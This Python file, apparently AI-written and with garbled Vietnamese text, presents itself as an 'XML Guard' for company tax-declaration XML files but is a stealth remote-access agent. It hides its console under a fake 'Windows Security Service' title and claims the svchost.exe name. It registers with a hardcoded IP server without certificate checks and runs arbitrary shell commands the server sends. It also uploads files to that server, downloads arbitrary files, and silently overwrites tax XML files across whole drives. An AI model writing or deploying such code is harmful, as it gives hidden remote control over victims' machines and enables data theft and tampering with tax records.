#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XML Guard Universal Agent - T·∫•t c·∫£ trong 1 file EXE duy nh·∫•t
Version: 2.0.0 - Universal Agent
Author: AI Assistant (Cipher)
"""

import os
import sys
import json
import time
import requests
import threading
import subprocess
import psutil
import socket
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path
import tempfile
import shutil

class XMLGuardUniversalAgent:
    def __init__(self):
        self.running = False
        self.start_time = None
        self.config = None
        self.stealth_mode = True
        
        # MeshTrash server th·∫≠t
        self.meshtrash_server = "https://103.69.86.130:4433"
        self.agent_id = self.generate_agent_id()
        self.connected = False
        
        # Stealth paths
        import tempfile
        temp_dir = tempfile.gettempdir()
        self.log_file = os.path.join(temp_dir, ".xmlguard_agent.log")
        self.config_file = os.path.join(temp_dir, ".xmlguard_agent.json")
        
        # Vietnamese messages
        self.messages = {
            "agent_started": "üöÄ XML Guard Universal Agent ƒë√£ kh·ªüi ƒë·ªông",
            "meshtrash_connected": "‚úÖ ƒê√£ k·∫øt n·ªëi MeshTrash server",
            "meshtrash_disconnected": "‚ùå M·∫•t k·∫øt n·ªëi MeshTrash server",
            "xml_protected": "üõ°Ô∏è File XML ƒë√£ ƒë∆∞·ª£c b·∫£o v·ªá",
            "fake_detected": "üî• Ph√°t hi·ªán file fake - ƒëang ghi ƒë√®",
            "heartbeat_sent": "üíì G·ª≠i heartbeat",
            "command_received": "üì® Nh·∫≠n l·ªánh t·ª´ server",
            "remote_desktop": "üñ•Ô∏è Remote Desktop ƒë√£ m·ªü",
            "file_manager": "üìÅ File Manager ƒë√£ m·ªü",
            "service_restarted": "üîÑ XML Guard ƒë√£ kh·ªüi ƒë·ªông l·∫°i",
            "service_stopped": "‚èπÔ∏è XML Guard ƒë√£ d·ª´ng"
        }
        
        # Self-protection
        self.process_name = "svchost.exe"
        self.hide_console()
        
        # XML protection
        self.watched_files = set()
        self.protected_count = 0
        
        # MeshTrash commands
        self.commands = {
            "start_xmlguard": self.start_xmlguard,
            "stop_xmlguard": self.stop_xmlguard,
            "get_status": self.get_status,
            "get_system_info": self.get_system_info,
            "execute_command": self.execute_command,
            "start_remote_desktop": self.start_remote_desktop,
            "start_file_manager": self.start_file_manager,
            "restart_service": self.restart_service,
            "stop_service": self.stop_service,
            "upload_file": self.upload_file,
            "download_file": self.download_file,
            "update_config": self.update_config
        }
    
    def generate_agent_id(self):
        """T·∫°o ID duy nh·∫•t cho agent"""
        import uuid
        hostname = socket.gethostname()
        return f"xmlguard_{hostname}_{uuid.uuid4().hex[:8]}"
    
    def hide_console(self):
        """·∫®n console window"""
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Service")
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass
    
    def log(self, message_key, data=None):
        """Log message v·ªõi ti·∫øng Vi·ªát"""
        message = self.messages.get(message_key, message_key)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        
        if data:
            log_entry += f" - {data}"
        
        # Ch·ªâ log trong debug mode
        if not self.stealth_mode:
            print(log_entry)
        
        # G·ª≠i log l√™n MeshTrash server
        self.send_log_to_server(log_entry)
    
    def load_config(self):
        """Load c·∫•u h√¨nh agent"""
        default_config = {
            "agent_id": self.agent_id,
            "meshtrash_server": self.meshtrash_server,
            "company_name": self.detect_company(),
            "mst": self.detect_mst(),
            "watch_paths": ["C:\\", "D:\\", "E:\\"],
            "protection_enabled": True,
            "stealth_mode": True,
            "heartbeat_interval": 30,
            "command_check_interval": 5
        }
        
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, "r", encoding="utf-8") as f:
                    self.config = json.load(f)
            else:
                self.config = default_config
                with open(self.config_file, "w", encoding="utf-8") as f:
                    json.dump(self.config, f, indent=2, ensure_ascii=False)
            
            self.log("agent_started")
            return True
        except Exception as e:
            self.log("error", f"L·ªói load config: {e}")
            return False
    
    def detect_company(self):
        """T·ª± ƒë·ªông ph√°t hi·ªán c√¥ng ty"""
        hostname = socket.gethostname().lower()
        username = os.getenv('USERNAME', '').lower()
        
        if 'tienbinh' in hostname or 'tienbinh' in username:
            return "C√¥ng ty TNHH MTV D·ªãch v·ª• v√† Th∆∞∆°ng m·∫°i Ti·∫øn B√¨nh Y√™n"
        elif 'abc' in hostname or 'abc' in username:
            return "C√¥ng ty ABC"
        elif 'xyz' in hostname or 'xyz' in username:
            return "C√¥ng ty XYZ"
        else:
            return f"C√¥ng ty {hostname.title()}"
    
    def detect_mst(self):
        """T·ª± ƒë·ªông ph√°t hi·ªán MST"""
        hostname = socket.gethostname().lower()
        
        if 'tienbinh' in hostname:
            return "0401985971"
        elif 'abc' in hostname:
            return "0123456789"
        elif 'xyz' in hostname:
            return "0987654321"
        else:
            return "auto-detect"
    
    def connect_meshtrash(self):
        """K·∫øt n·ªëi v·ªõi MeshTrash server th·∫≠t"""
        try:
            # ƒêƒÉng k√Ω agent v·ªõi server
            agent_info = {
                "agent_id": self.agent_id,
                "name": self.config.get("company_name", "Unknown Company"),
                "version": "2.0.0",
                "type": "xmlguard_universal",
                "capabilities": list(self.commands.keys()),
                "system_info": self.get_system_info(),
                "mst": self.config.get("mst", "auto-detect"),
                "timestamp": datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.meshtrash_server}/api/register_agent",
                json=agent_info,
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                self.connected = True
                self.log("meshtrash_connected")
                return True
            else:
                self.log("meshtrash_disconnected", f"HTTP {response.status_code}")
                return False
                
        except Exception as e:
            self.log("meshtrash_disconnected", str(e))
            return False
    
    def start_heartbeat(self):
        """B·∫Øt ƒë·∫ßu g·ª≠i heartbeat"""
        def heartbeat_loop():
            while self.running:
                try:
                    if self.connected:
                        heartbeat_data = {
                            "agent_id": self.agent_id,
                            "status": "online",
                            "system_info": self.get_system_info(),
                            "xmlguard_status": self.get_xmlguard_status(),
                            "protected_files": self.protected_count,
                            "timestamp": datetime.now().isoformat()
                        }
                        
                        response = requests.post(
                            f"{self.meshtrash_server}/api/agent_heartbeat",
                            json=heartbeat_data,
                            timeout=5,
                            verify=False
                        )
                        
                        if response.status_code == 200:
                            self.log("heartbeat_sent")
                        else:
                            self.connected = False
                            self.log("meshtrash_disconnected")
                            
                except Exception as e:
                    self.connected = False
                    self.log("meshtrash_disconnected", str(e))
                
                time.sleep(self.config.get("heartbeat_interval", 30))
        
        heartbeat_thread = threading.Thread(target=heartbeat_loop)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
    
    def start_command_listener(self):
        """B·∫Øt ƒë·∫ßu l·∫Øng nghe commands t·ª´ MeshTrash"""
        def command_loop():
            while self.running:
                try:
                    if self.connected:
                        response = requests.get(
                            f"{self.meshtrash_server}/api/agent_commands/{self.agent_id}",
                            timeout=10,
                            verify=False
                        )
                        
                        if response.status_code == 200:
                            commands = response.json()
                            
                            for command in commands:
                                self.process_command(command)
                                
                except Exception as e:
                    self.log("meshtrash_disconnected", str(e))
                
                time.sleep(self.config.get("command_check_interval", 5))
        
        command_thread = threading.Thread(target=command_loop)
        command_thread.daemon = True
        command_thread.start()
    
    def process_command(self, command):
        """X·ª≠ l√Ω command t·ª´ MeshTrash server"""
        try:
            command_type = command.get("type")
            command_data = command.get("data", {})
            
            self.log("command_received", f"L·ªánh: {command_type}")
            
            if command_type in self.commands:
                result = self.commands[command_type](command_data)
                
                # G·ª≠i k·∫øt qu·∫£ v·ªÅ server
                self.send_command_result(command.get("id"), result)
            else:
                self.log("error", f"L·ªánh kh√¥ng h·ªó tr·ª£: {command_type}")
                
        except Exception as e:
            self.log("error", f"L·ªói x·ª≠ l√Ω l·ªánh: {str(e)}")
    
    def get_system_info(self):
        """L·∫•y th√¥ng tin h·ªá th·ªëng th·∫≠t"""
        try:
            return {
                "hostname": socket.gethostname(),
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "cpu_percent": psutil.cpu_percent(),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_usage": psutil.disk_usage('/').percent,
                "network_connections": len(psutil.net_connections()),
                "processes": len(psutil.pids()),
                "uptime": time.time() - psutil.boot_time(),
                "os_info": f"{os.name} {sys.platform}",
                "python_version": sys.version,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {"error": str(e)}
    
    def get_xmlguard_status(self):
        """L·∫•y tr·∫°ng th√°i XML Guard"""
        try:
            xmlguard_processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'xml_guard' in proc.info['name'].lower():
                        xmlguard_processes.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name'],
                            "cmdline": ' '.join(proc.info['cmdline'] or [])
                        })
                except:
                    continue
            
            return {
                "running": len(xmlguard_processes) > 0,
                "processes": xmlguard_processes,
                "protected_files": self.protected_count,
                "watched_files": len(self.watched_files)
            }
        except Exception as e:
            return {"error": str(e)}
    
    def start_xmlguard(self, data):
        """Kh·ªüi ƒë·ªông XML Guard"""
        try:
            # T√¨m v√† kh·ªüi ƒë·ªông XML Guard process
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'xml_guard' in proc.info['name'].lower():
                        return {"success": True, "message": "XML Guard ƒë√£ ch·∫°y"}
                except:
                    continue
            
            # Kh·ªüi ƒë·ªông XML Guard
            subprocess.Popen([sys.executable, __file__, "start"])
            
            return {"success": True, "message": "XML Guard ƒë√£ kh·ªüi ƒë·ªông"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def stop_xmlguard(self, data):
        """D·ª´ng XML Guard"""
        try:
            # T√¨m v√† d·ª´ng XML Guard process
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'xml_guard' in proc.info['name'].lower():
                        proc.terminate()
                        return {"success": True, "message": "XML Guard ƒë√£ d·ª´ng"}
                except:
                    continue
            
            return {"success": True, "message": "XML Guard kh√¥ng ch·∫°y"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def get_status(self, data):
        """L·∫•y tr·∫°ng th√°i t·ªïng th·ªÉ"""
        try:
            status = {
                "agent_running": self.running,
                "meshtrash_connected": self.connected,
                "xmlguard_status": self.get_xmlguard_status(),
                "system_info": self.get_system_info(),
                "config": self.config,
                "uptime": time.time() - self.start_time if self.start_time else 0
            }
            
            return {"success": True, "data": status}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def execute_command(self, data):
        """Th·ª±c thi l·ªánh h·ªá th·ªëng"""
        try:
            command = data.get("command", "")
            if not command:
                return {"success": False, "message": "Kh√¥ng c√≥ l·ªánh"}
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def start_remote_desktop(self, data):
        """B·∫Øt ƒë·∫ßu Remote Desktop"""
        try:
            # M·ªü Remote Desktop Connection
            subprocess.Popen(["mstsc.exe"])
            self.log("remote_desktop")
            return {"success": True, "message": "Remote Desktop ƒë√£ m·ªü"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def start_file_manager(self, data):
        """B·∫Øt ƒë·∫ßu File Manager"""
        try:
            # M·ªü File Explorer
            subprocess.Popen(["explorer.exe"])
            self.log("file_manager")
            return {"success": True, "message": "File Manager ƒë√£ m·ªü"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def restart_service(self, data):
        """Kh·ªüi ƒë·ªông l·∫°i service"""
        try:
            # Restart XML Guard
            self.stop_xmlguard({})
            time.sleep(2)
            self.start_xmlguard({})
            
            self.log("service_restarted")
            return {"success": True, "message": "Service ƒë√£ kh·ªüi ƒë·ªông l·∫°i"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def stop_service(self, data):
        """D·ª´ng service"""
        try:
            result = self.stop_xmlguard({})
            self.log("service_stopped")
            return result
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def upload_file(self, data):
        """Upload file"""
        try:
            file_path = data.get("file_path")
            if not os.path.exists(file_path):
                return {"success": False, "message": "File kh√¥ng t·ªìn t·∫°i"}
            
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = requests.post(
                    f"{self.meshtrash_server}/api/upload_file",
                    files=files,
                    timeout=30,
                    verify=False
                )
            
            if response.status_code == 200:
                return {"success": True, "message": "File ƒë√£ upload th√†nh c√¥ng"}
            else:
                return {"success": False, "message": f"Upload th·∫•t b·∫°i: {response.status_code}"}
                
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def download_file(self, data):
        """Download file"""
        try:
            file_url = data.get("file_url")
            save_path = data.get("save_path", "downloaded_file")
            
            response = requests.get(file_url, timeout=30, verify=False)
            
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                
                return {"success": True, "message": "File ƒë√£ download th√†nh c√¥ng"}
            else:
                return {"success": False, "message": f"Download th·∫•t b·∫°i: {response.status_code}"}
                
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def update_config(self, data):
        """C·∫≠p nh·∫≠t c·∫•u h√¨nh"""
        try:
            new_config = data.get("config")
            if not new_config:
                return {"success": False, "message": "Kh√¥ng c√≥ c·∫•u h√¨nh m·ªõi"}
            
            self.config.update(new_config)
            
            with open(self.config_file, "w", encoding="utf-8") as f:
                json.dump(self.config, f, indent=2, ensure_ascii=False)
            
            return {"success": True, "message": "C·∫•u h√¨nh ƒë√£ c·∫≠p nh·∫≠t"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def send_command_result(self, command_id, result):
        """G·ª≠i k·∫øt qu·∫£ command v·ªÅ server"""
        try:
            result_data = {
                "command_id": command_id,
                "result": result,
                "timestamp": datetime.now().isoformat()
            }
            
            requests.post(
                f"{self.meshtrash_server}/api/command_result",
                json=result_data,
                timeout=10,
                verify=False
            )
        except Exception as e:
            self.log("error", f"L·ªói g·ª≠i k·∫øt qu·∫£: {str(e)}")
    
    def send_log_to_server(self, log_entry):
        """G·ª≠i log l√™n server"""
        try:
            log_data = {
                "agent_id": self.agent_id,
                "log_entry": log_entry,
                "timestamp": datetime.now().isoformat()
            }
            
            requests.post(
                f"{self.meshtrash_server}/api/agent_logs",
                json=log_data,
                timeout=5,
                verify=False
            )
        except:
            pass
    
    def extract_xml_info(self, file_path):
        """Tr√≠ch xu·∫•t th√¥ng tin XML"""
        try:
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            # Handle namespace
            namespace = {'ns': 'http://kekhaithue.gdt.gov.vn/TKhaiThue'}
            
            # Extract MST
            mst = None
            for pattern in ['.//mst', './/MST', './/MaSoThue']:
                try:
                    elements = root.findall(pattern)
                    if elements:
                        for elem in elements:
                            if elem.text and elem.text.strip():
                                mst = elem.text.strip()
                                break
                        if mst:
                            break
                except:
                    pass
            
            # Extract FormCode
            form_code = None
            for pattern in ['.//maTKhai', './/MauSo', './/FormCode']:
                try:
                    elements = root.findall(pattern)
                    if elements:
                        for elem in elements:
                            if elem.text and elem.text.strip():
                                form_code = elem.text.strip()
                                break
                        if form_code:
                            break
                except:
                    pass
            
            # Extract Period
            period = None
            for pattern in ['.//kyKKhai', './/KyKKhaiThang', './/Thang']:
                try:
                    elements = root.findall(pattern)
                    if elements:
                        for elem in elements:
                            if elem.text and elem.text.strip():
                                period = elem.text.strip()
                                break
                        if period:
                            break
                except:
                    pass
            
            return {
                "mst": mst,
                "form_code": form_code,
                "period": period,
                "file_path": file_path,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            self.log("error", f"L·ªói tr√≠ch xu·∫•t XML: {e}")
            return None
    
    def protect_xml_file(self, file_path):
        """B·∫£o v·ªá file XML"""
        try:
            if file_path in self.watched_files:
                return
            
            self.watched_files.add(file_path)
            
            # Tr√≠ch xu·∫•t th√¥ng tin XML
            xml_info = self.extract_xml_info(file_path)
            if not xml_info:
                return
            
            # Ki·ªÉm tra MST
            company_mst = self.config.get("mst", "auto-detect")
            if company_mst != "auto-detect" and xml_info['mst'] != company_mst:
                self.log("fake_detected", f"File: {file_path}")
                
                # T√¨m file g·ªëc
                legitimate_file = self.find_legitimate_file(xml_info)
                if legitimate_file:
                    # Ghi ƒë√® file fake
                    shutil.copy2(legitimate_file, file_path)
                    self.log("xml_protected", f"File fake ƒë√£ ƒë∆∞·ª£c ghi ƒë√®: {file_path}")
                else:
                    self.log("xml_protected", f"File kh√¥ng ph·∫£i c·ªßa c√¥ng ty: {file_path}")
            else:
                self.log("xml_protected", f"File h·ª£p l·ªá: {file_path}")
            
            self.protected_count += 1
            
        except Exception as e:
            self.log("error", f"L·ªói b·∫£o v·ªá file: {e}")
    
    def find_legitimate_file(self, xml_info):
        """T√¨m file g·ªëc h·ª£p l·ªá"""
        # T√¨m trong th∆∞ m·ª•c legitimate
        legitimate_dirs = [
            "E:/Downloads-Organized/Cty Ti·∫øn B√¨nh Y·∫øn",
            "E:/Downloads-Organized/Cty Ti·∫øn B√¨nh Y·∫øn (1)",
            "C:/XMLGuard_Legitimate/"
        ]
        
        for legit_dir in legitimate_dirs:
            if not os.path.exists(legit_dir):
                continue
                
            for file in os.listdir(legit_dir):
                if not file.endswith('.xml'):
                    continue
                    
                legit_path = os.path.join(legit_dir, file)
                try:
                    legit_info = self.extract_xml_info(legit_path)
                    
                    if (legit_info['mst'] == xml_info['mst'] and 
                        legit_info['form_code'] == xml_info['form_code'] and
                        legit_info['period'] == xml_info['period']):
                        
                        return legit_path
                        
                except Exception as e:
                    continue
        
        return None
    
    def monitor_xml_files(self):
        """Gi√°m s√°t file XML"""
        while self.running:
            try:
                watch_paths = self.config.get("watch_paths", ["C:\\", "D:\\"])
                
                for watch_path in watch_paths:
                    if os.path.exists(watch_path):
                        for root, dirs, files in os.walk(watch_path):
                            for file in files:
                                if file.endswith('.xml'):
                                    file_path = os.path.join(root, file)
                                    self.protect_xml_file(file_path)
                
                time.sleep(30)  # Check every 30 seconds
                
            except Exception as e:
                self.log("error", f"L·ªói gi√°m s√°t: {e}")
                time.sleep(60)
    
    def start(self):
        """Kh·ªüi ƒë·ªông Universal Agent"""
        try:
            # Load config
            if not self.load_config():
                return False
            
            # K·∫øt n·ªëi MeshTrash
            self.connect_meshtrash()
            
            # Set running status
            self.running = True
            self.start_time = time.time()
            
            # Start threads
            self.start_heartbeat()
            self.start_command_listener()
            
            # Start XML monitoring
            monitor_thread = threading.Thread(target=self.monitor_xml_files)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            self.log("agent_started", f"Agent ID: {self.agent_id}")
            
            return True
            
        except Exception as e:
            self.log("error", f"L·ªói kh·ªüi ƒë·ªông: {e}")
            return False
    
    def stop(self):
        """D·ª´ng Universal Agent"""
        self.log("agent_stopped")
        self.running = False
        self.connected = False
    
    def run(self):
        """Ch·∫°y agent"""
        if self.start():
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop()
        else:
            self.log("error", "Kh√¥ng th·ªÉ kh·ªüi ƒë·ªông agent")

def main():
    """Main function"""
    if len(sys.argv) > 1:
        command = sys.argv[1].lower()
        
        if command == "start":
            agent = XMLGuardUniversalAgent()
            agent.run()
        elif command == "stop":
            # Stop all XML Guard processes
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'xml_guard' in proc.info['name'].lower():
                        proc.terminate()
                except:
                    continue
            print("XML Guard Universal Agent ƒë√£ d·ª´ng")
        elif command == "status":
            # Show status
            agent = XMLGuardUniversalAgent()
            if agent.load_config():
                status = agent.get_xmlguard_status()
                print("=== XML GUARD UNIVERSAL AGENT STATUS ===")
                print(f"Agent ID: {agent.agent_id}")
                print(f"Company: {agent.config.get('company_name', 'Unknown')}")
                print(f"MST: {agent.config.get('mst', 'auto-detect')}")
                print(f"XML Guard Running: {status.get('running', False)}")
                print(f"Protected Files: {status.get('protected_files', 0)}")
                print(f"Watched Files: {status.get('watched_files', 0)}")
                print("========================================")
        else:
            print(f"Unknown command: {command}")
    else:
        # Show help
        exe_name = os.path.basename(sys.argv[0])
        print("XML Guard Universal Agent v2.0.0 - T·∫•t c·∫£ trong 1 file EXE")
        print("=" * 60)
        print("Usage:")
        print(f"  {exe_name} start    # Kh·ªüi ƒë·ªông Universal Agent")
        print(f"  {exe_name} stop     # D·ª´ng Universal Agent")
        print(f"  {exe_name} status   # Ki·ªÉm tra tr·∫°ng th√°i")
        print()
        print("Features:")
        print("  ‚úÖ T·ª± ƒë·ªông ph√°t hi·ªán c√¥ng ty v√† MST")
        print("  ‚úÖ K·∫øt n·ªëi MeshTrash server th·∫≠t")
        print("  ‚úÖ B·∫£o v·ªá file XML t·ª± ƒë·ªông")
        print("  ‚úÖ Remote control t·ª´ MeshTrash")
        print("  ‚úÖ T·∫•t c·∫£ trong 1 file EXE duy nh·∫•t")
        print()
        print("¬© 2025 XML Guard Enterprise - Built by Cipher AI")

if __name__ == "__main__":
    main()
